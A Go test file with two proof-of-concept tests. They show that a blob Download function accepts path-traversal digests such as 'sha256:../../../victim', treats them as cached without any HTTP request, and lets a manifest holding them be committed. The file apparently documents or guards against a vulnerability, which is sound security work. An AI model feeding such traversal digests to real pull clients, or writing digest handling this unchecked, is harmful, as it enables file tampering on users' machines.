package transfer

import (
	"context"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"sync/atomic"
	"testing"
)

func TestPoC_Download_EarlyExitCacheBypass_AcceptsTraversalDigest(t *testing.T) {
	tmp := t.TempDir()
	destDir := filepath.Join(tmp, "blobs")
	if err := os.MkdirAll(destDir, 0o755); err != nil {
		t.Fatal(err)
	}

	victim := []byte("victim-file-contents")
	victimPath := filepath.Join(tmp, "victim")
	if err := os.WriteFile(victimPath, victim, 0o600); err != nil {
		t.Fatal(err)
	}

	var hits atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hits.Add(1)
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer srv.Close()

	err := Download(context.Background(), DownloadOptions{
		Blobs: []Blob{{
			Digest: "sha256:../../../victim",
			Size:   int64(len(victim)),
		}},
		BaseURL:    srv.URL,
		DestDir:    destDir,
		Repository: "library/_",
	})

	if err != nil {
		t.Fatalf("Download returned error: %v — early-exit not hit", err)
	}
	if hits.Load() != 0 {
		t.Errorf("HTTP server was contacted %d times — early-exit should have skipped network entirely", hits.Load())
	}
	t.Logf("Early-exit cache bypass confirmed: traversal digest accepted, no HTTP request made, malicious 'blob' considered downloaded → manifest commit would proceed.")
}

func TestPoC_Download_EarlyExitChainEndState(t *testing.T) {
	tmp := t.TempDir()
	destDir := filepath.Join(tmp, "blobs")
	if err := os.MkdirAll(destDir, 0o755); err != nil {
		t.Fatal(err)
	}

	for _, f := range []struct {
		path string
		body string
	}{
		{filepath.Join(tmp, "victim_a"), "victim-A-contents"},
		{filepath.Join(tmp, "victim_b"), "victim-B-contents-longer"},
	} {
		if err := os.WriteFile(f.path, []byte(f.body), 0o600); err != nil {
			t.Fatal(err)
		}
	}

	var hits atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hits.Add(1)
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer srv.Close()

	err := Download(context.Background(), DownloadOptions{
		Blobs: []Blob{
			{Digest: "sha256:../../../victim_a", Size: int64(len("victim-A-contents"))},
			{Digest: "sha256:../../../victim_b", Size: int64(len("victim-B-contents-longer"))},
		},
		BaseURL:    srv.URL,
		DestDir:    destDir,
		Repository: "library/_",
	})

	if err != nil {
		t.Fatalf("Download returned error: %v", err)
	}
	if hits.Load() != 0 {
		t.Errorf("HTTP server was contacted %d times — should be 0", hits.Load())
	}

	matches, _ := filepath.Glob(filepath.Join(destDir, "*"))
	if len(matches) != 0 {
		t.Errorf("destDir contains files after exploit (should be empty since no real blob was downloaded): %v", matches)
	}
	t.Logf("Confirmed: 2 traversal digests accepted, 0 HTTP requests, destDir empty. In a real pull flow, the manifest containing these digests would now be committed to disk by pullWithTransfer.")
}
